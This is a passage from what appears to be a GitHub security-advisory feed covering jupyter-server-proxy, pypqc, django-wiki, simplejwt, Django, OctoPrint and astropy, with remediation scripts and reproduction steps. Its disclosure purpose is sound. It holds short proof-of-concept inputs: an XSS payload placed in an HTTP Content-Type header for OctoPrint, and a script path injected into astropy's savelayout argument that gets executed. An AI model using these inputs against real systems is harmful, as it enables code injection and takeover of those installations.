<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h3 id="for-jupyterhub-admins-of-z2jh-installations">For JupyterHub admins of <a href="https://z2jh.jupyter.org">Z2JH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>
<h4 id="1-check-for-vulnerabilities">1. Check for vulnerabilities</h4>
<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>
<p>To check if an individual docker image is vulnerable, use a command like:</p>
<pre><code class="language-bash">CHECK_IMAGE=jupyter/base-notebook:2023-10-20
docker run --rm $CHECK_IMAGE python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>
<pre><code class="language-yaml">singleuser:
  image:
    name: quay.io/jupyter/pangeo-notebook
    tag: master
    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be
    # declared to Always if you make use of mutable tags
    pullPolicy: Always
</code></pre>
<h4 id="2-patch-vulnerabilities-dynamically">2. Patch vulnerabilities dynamically</h4>
<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>
<p>Below is JupyterHub Helm chart configuration that relies on <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles"><code>singleuser.extraFiles</code></a> and <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>
<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>
<pre><code class="language-yaml">singleuser:
  cmd:
    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
    - jupyterhub-singleuser
  extraFiles:
    ghsa-w3vc-fx9p-wp4v-check-patch-run:
      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
      mode: 0755
      stringData: |
        #!/usr/bin/env python3
        """
        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v
        in user servers started by a JupyterHub. The script will execute any command
        passed via arguments if provided, allowing it to wrap a user server startup call
        to `jupyterhub-singleuser` for example.

        Use and function of this script can be further discussed in
        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.

        Script adjustments:
        - UPGRADE_IF_VULNERABLE
        - ERROR_IF_VULNERABLE

        Script patching assumptions:
        - script is run before the jupyter server starts
        - pip is available
        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy

        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.
        """

        import os
        import subprocess
        import sys

        # adjust these to meet vulnerability mitigation needs
        UPGRADE_IF_VULNERABLE = True
        ERROR_IF_VULNERABLE = True


        def check_vuln():
            """
            Checks for the vulnerability by looking to see if __version__ is available
            as it coincides with the patched versions (3.2.3 and 4.1.1).
            """
            try:
                import jupyter_server_proxy

                return False if hasattr(jupyter_server_proxy, "__version__") else True
            except:
                return False


        def get_version_specifier():
            """
            Returns a pip version specifier for use with `--no-deps` meant to do as
            little as possible besides patching the vulnerability and remaining
            functional.
            """
            old = ["jupyter-server-proxy&gt;=3.2.3,&lt;4"]
            new = ["jupyter-server-proxy&gt;=4.1.1,&lt;5", "simpervisor&gt;=1,&lt;2"]

            try:
                if sys.version_info &lt; (3, 8):
                    return old

                from importlib.metadata import version

                jsp_version = version("jupyter-server-proxy")
                if int(jsp_version.split(".")[0]) &lt; 4:
                    return old
            except:
                pass
            return new


        def patch_vuln():
            """
            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using
            pip. Returns True if the patch is applied successfully, otherwise False.
            """
            # attempt upgrade via pip, takes ~4 seconds
            proc = subprocess.run(
                [sys.executable, "-m", "pip", "--version"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pip_available = proc.returncode == 0
            if pip_available:
                proc = subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--no-deps"]
                    + get_version_specifier()
                )
                if proc.returncode == 0:
                    return True
            return False


        def main():
            if check_vuln():
                warning_or_error = (
                    "ERROR" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else "WARNING"
                )
                print(
                    f"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see "
                    "https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.",
                    flush=True,
                )
                if warning_or_error == "ERROR":
                    sys.exit(1)

                if UPGRADE_IF_VULNERABLE:
                    print(
                        "INFO: Attempting to upgrade jupyter-server-proxy using pip...",
                        flush=True,
                    )
                    if patch_vuln():
                        print(
                            "INFO: Attempt to upgrade jupyter-server-proxy succeeded!",
                            flush=True,
                        )
                    else:
                        warning_or_error = "ERROR" if ERROR_IF_VULNERABLE else "WARNING"
                        print(
                            f"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!",
                            flush=True,
                        )
                        if warning_or_error == "ERROR":
                            sys.exit(1)

            if len(sys.argv) &gt;= 2:
                print("INFO: Executing provided command", flush=True)
                os.execvp(sys.argv[1], sys.argv[1:])
            else:
                print("INFO: No command to execute provided", flush=True)


        main()
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers-1">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h2 id="simple-reproduction">Simple Reproduction</h2>
<details><summary>Expand to read more</summary>

<h3 id="setup-application-to-proxy">Setup application to proxy</h3>
<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>
<pre><code class="language-python">from tornado import websocket, web, ioloop

class EchoWebSocket(websocket.WebSocketHandler):
    def open(self):
        print("WebSocket opened")

    def on_message(self, message):
        self.write_message(u"You said: " + message)

    def on_close(self):
        print("WebSocket closed")

class HiHandler(web.RequestHandler):
    def get(self):
        self.write("Hi")

app = web.Application([
    (r'/ws', EchoWebSocket),
    (r'/hi', HiHandler)
])

if __name__ == '__main__':
    app.listen(9500)
    ioloop.IOLoop.instance().start()
</code></pre>
<h3 id="setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>
<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>
<pre><code class="language-bash">python -m venv clean-env/
source clean-env/bin/activate
pip install jupyter-server-proxy
jupyter server
</code></pre>
<h3 id="verify-http-requests-require-authentication">Verify HTTP requests require authentication</h3>
<pre><code class="language-bash">curl -L http://127.0.0.1:8888/proxy/9500/hi
</code></pre>
<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>
<p>This is secure as intended.</p>
<h3 id="verify-websocket-requests-doesnt-authentication">Verify websocket requests doesn't authentication</h3>
<p>The example makes use of <a href="https://github.com/vi/websocat">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>
<pre><code class="language-bash">websocat ws://localhost:8888/proxy/9500/ws
</code></pre>
<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>
</details>
### References

<ul>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28179">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>
<li><a href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-20T15:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypqc] pypqc private key retrieval vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rc4p-p3j9-6577</id>
        <link href="https://github.com/advisories/GHSA-rc4p-p3j9-6577"/>
        <updated>2024-03-19T18:27:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>kyber512</code>, <code>kyber768</code>, and <code>kyber1024</code> only: An attacker able to submit many decapsulation requests against a single private key, and to gain timing information about the decapsulation, could recover the private key. Proof-of-concept exploit exists for a local attacker.</p>
<p>CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P/RL:O/RC:C  </p>
<h3 id="patches">Patches</h3>
<p>Version 0.0.6.1 and newer of PyPQC is patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds have been reported. The 0.0.6 -&gt; 0.0.6.1 upgrade should be a drop-in replacement; it has no known breaking changes.</p>
<h3 id="references">References</h3>
<h4 id="timeline">Timeline</h4>
<ol>
<li><p>Cryspen researchers privately reported KyberSlash to the reference implementation maintainers.</p>
</li>
<li><p>Peter Schwabe partially patched KyberSlash (only "KyberSlash 1") in the reference implementation on December 1st, 2023, but did not document or advertise this as a security patch.<br><a href="https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></p>
</li>
<li><p>Daniel J. Bernstein publicly reported KyberSlash as a security issue on December 15th, 2023.<br><a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></p>
</li>
<li><p>Daniel J. Bernstein created a webpage for authoritative reference about KyberSlash on December 19th, 2023.<br><a href="https://kyberslash.cr.yp.to/">https://kyberslash.cr.yp.to/</a></p>
</li>
<li><p>Thom Wiggers acknowledged KyberSlash as a security issue on December 19th, 2023.<br><a href="https://www.github.com/PQClean/PQClean/issues/533">https://www.github.com/PQClean/PQClean/issues/533</a></p>
</li>
<li><p>Prasanna Ravi and Matthias Kannwischer privately reported further details about KyberSlash ("KyberSlash 2") to the reference implementation maintainers.</p>
</li>
<li><p>Peter Schwabe completely patched KyberSlash in the reference implementation on December 29th, 2023.
<a href="https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></p>
</li>
<li><p>Prasanna Ravi and Matthias Kannwischer publicly reported their findings ("KyberSlash 2") on December 30th, 2023.<br><a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/ovODsdY7AwAJ">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/ovODsdY7AwAJ</a></p>
</li>
<li><p>Daniel J. Bernstein published a proof-of-concept exploit (only validated for a local attacker) for KyberSlash on December 30th, 2023.<br><a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></p>
</li>
<li><p>Thom Wiggers completely patched KyberSlash in PQClean on January 25th, 2024.<br>   <a href="https://www.github.com/PQClean/PQClean/commit/3b43bc6fe46fe47be38f87af5019a7f1462ae6dd">https://www.github.com/PQClean/PQClean/commit/3b43bc6fe46fe47be38f87af5019a7f1462ae6dd</a></p>
</li>
<li><p>James E. A. completely patched KyberSlash in pypqc and released a security update on January 26th, 2024.<br>   <a href="https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></p>
</li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577">https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577</a></li>
<li><a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></li>
<li><a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></li>
<li><a href="https://kyberslash.cr.yp.to">https://kyberslash.cr.yp.to</a></li>
<li><a href="https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></li>
<li><a href="https://www.github.com/PQClean/PQClean/issues/533">https://www.github.com/PQClean/PQClean/issues/533</a></li>
<li><a href="https://www.github.com/PQClean/PQClean/pull/534#event-11595728485">https://www.github.com/PQClean/PQClean/pull/534#event-11595728485</a></li>
<li><a href="https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></li>
<li><a href="https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></li>
<li><a href="https://github.com/advisories/GHSA-rc4p-p3j9-6577">https://github.com/advisories/GHSA-rc4p-p3j9-6577</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rc4p-p3j9-6577</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-22T21:41:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wiki] Denial of service via regular expression]]></title>
        <id>https://github.com/advisories/GHSA-wj85-w4f4-xh8h</id>
        <link href="https://github.com/advisories/GHSA-wj85-w4f4-xh8h"/>
        <updated>2024-03-19T18:30:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All historical installations of django-wiki are vulnerable to maliciously crafted article content, that can cause severe use of server CPU through a regular expression loop.</p>
<h3 id="patches">Patches</h3>
<h3 id="workarounds">Workarounds</h3>
<p>Close off access to create and edit articles by anonymous users.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/django-wiki/django-wiki/security/advisories/GHSA-wj85-w4f4-xh8h">https://github.com/django-wiki/django-wiki/security/advisories/GHSA-wj85-w4f4-xh8h</a></li>
<li><a href="https://github.com/django-wiki/django-wiki/commit/8e280fd6c0bd27ce847c67b2d216c6cbf920f88c">https://github.com/django-wiki/django-wiki/commit/8e280fd6c0bd27ce847c67b2d216c6cbf920f88c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28865">https://nvd.nist.gov/vuln/detail/CVE-2024-28865</a></li>
<li><a href="https://github.com/advisories/GHSA-wj85-w4f4-xh8h">https://github.com/advisories/GHSA-wj85-w4f4-xh8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wj85-w4f4-xh8h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:37:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djangorestframework-simplejwt] Improper Privilege Management in djangorestframework-simplejwt]]></title>
        <id>https://github.com/advisories/GHSA-5vcc-86wm-547q</id>
        <link href="https://github.com/advisories/GHSA-5vcc-86wm-547q"/>
        <updated>2024-03-20T14:05:42.000Z</updated>
        <content type="html"><![CDATA[<p>djangorestframework-simplejwt version 5.3.1 and before is vulnerable to information disclosure. A user can access web application resources even after their account has been disabled due to missing user validation checks via the for_user method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22513">https://nvd.nist.gov/vuln/detail/CVE-2024-22513</a></li>
<li><a href="https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513">https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513</a></li>
<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281">https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281</a></li>
<li><a href="https://github.com/advisories/GHSA-5vcc-86wm-547q">https://github.com/advisories/GHSA-5vcc-86wm-547q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vcc-86wm-547q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-16T09:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2024-03-18T20:36:42.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2024-03-18T20:36:42.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Regular expression denial-of-service in Django]]></title>
        <id>https://github.com/advisories/GHSA-vm8q-m57g-pff3</id>
        <link href="https://github.com/advisories/GHSA-vm8q-m57g-pff3"/>
        <updated>2024-03-18T20:36:42.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27351">https://nvd.nist.gov/vuln/detail/CVE-2024-27351</a></li>
<li><a href="https://docs.djangoproject.com/en/5.0/releases/security">https://docs.djangoproject.com/en/5.0/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/mar/04/security-releases">https://www.djangoproject.com/weblog/2024/mar/04/security-releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-47.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vm8q-m57g-pff3">https://github.com/advisories/GHSA-vm8q-m57g-pff3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm8q-m57g-pff3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-15T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] XSS via the "Snapshot Test" feature in Classic Webcam plugin settings]]></title>
        <id>https://github.com/advisories/GHSA-x7mf-wrh9-r76c</id>
        <link href="https://github.com/advisories/GHSA-x7mf-wrh9-r76c"/>
        <updated>2024-03-19T18:31:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to configure or talk a victim with administrator rights into configuring a webcam snapshot URL which when tested through the "Test" button included in the web interface will execute JavaScript code in the victims browser when attempting to render the snapshot image.</p>
<p>An attacker who successfully talked a victim with admin rights into performing a snapshot test with such a crafted URL could use this to retrieve or modify sensitive configuration settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious way.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability will be patched in version 1.10.0.</p>
<h3 id="workaround">Workaround</h3>
<p>OctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation and what settings they modify based on instructions by strangers.</p>
<h3 id="poc">PoC</h3>
<p>Below are the steps to reproduce the vulnerability:</p>
<ol>
<li><p>Create a URL that responds with a malicious content type. For example, creating the following python script:</p>
<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'image/"onerror="alert(1)"')
        self.end_headers()
        self.wfile.write(b'Ok')

def run():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, MyHTTPRequestHandler)
    print('Server listening on 0.0.0.0:8080...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
</code></pre>
</li>
<li><p>Go to OctoPrint settings --&gt; Plugins --&gt; Classic Webcam and enter the URL of that page as the Snapshot URL. </p>
</li>
<li><p>Click on the "Test" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.</p>
</li>
</ol>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c</a></li>
<li><a href="https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517">https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28237">https://nvd.nist.gov/vuln/detail/CVE-2024-28237</a></li>
<li><a href="https://github.com/advisories/GHSA-x7mf-wrh9-r76c">https://github.com/advisories/GHSA-x7mf-wrh9-r76c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x7mf-wrh9-r76c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astropy] RCE in TranformGraph().to_dot_graph function]]></title>
        <id>https://github.com/advisories/GHSA-h2x6-5jx5-46hf</id>
        <link href="https://github.com/advisories/GHSA-h2x6-5jx5-46hf"/>
        <updated>2024-03-18T21:46:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>RCE due to improper input validation in TranformGraph().to_dot_graph function</p>
<h3 id="details">Details</h3>
<p>Due to improper input validation a malicious user can provide a command or a script file as a value to <code>savelayout</code> argument, which will be placed as the first value in a list of arguments passed to <code>subprocess.Popen</code>. 
<a href="https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539">https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539</a>
Although an error will be raised, the command or script will be executed successfully.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-shell">$ cat /tmp/script
#!/bin/bash
echo astrorce &gt; /tmp/poc.txt
</code></pre>
<pre><code class="language-shell">$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; from astropy.coordinates.transformations import TransformGraph
&gt;&gt;&gt; tg = TransformGraph()
&gt;&gt;&gt; tg.to_dot_graph(savefn="/tmp/1.txt", savelayout="/tmp/script")
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py", line 584, in to_dot_graph
    stdout, stderr = proc.communicate(dotgraph)
  File "/usr/lib/python3.9/subprocess.py", line 1134, in communicate
    stdout, stderr = self._communicate(input, endtime, timeout)
